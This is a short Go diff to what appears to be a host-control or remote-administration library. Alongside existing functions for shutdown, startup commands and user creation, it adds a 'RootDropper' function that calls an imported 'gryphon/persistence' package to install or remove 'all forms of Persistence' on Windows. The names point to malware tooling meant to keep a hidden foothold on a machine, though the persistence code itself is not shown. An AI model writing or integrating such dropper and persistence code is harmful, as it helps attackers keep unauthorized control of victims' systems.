@@ -12,6 +12,7 @@ import (
 	"github.com/matishsiao/goInfo"
 	"github.com/mitchellh/go-homedir"
 	ps "github.com/mitchellh/go-ps"
+	"github.com/whiterabb17/gryphon/persistence"
 )
 
 // Info is used to return basic system information.
@@ -192,6 +193,16 @@ func Shutdown() error {
 // AddPersistentCommand creates a task that runs a given command on startup.
 func AddPersistentCommand(cmd string) error {
 	return addPersistentCommand(cmd)
+}
+
+// Attempts to install all forms of Persistence [Windows Only]
+func RootDropper(install bool) error {
+	if install {
+		return persistence.Install()
+	} else {
+		_, er := persistence.Uninstall()
+		return er
+	}
 }
 
 func CreateUser(user string, pass string) error {
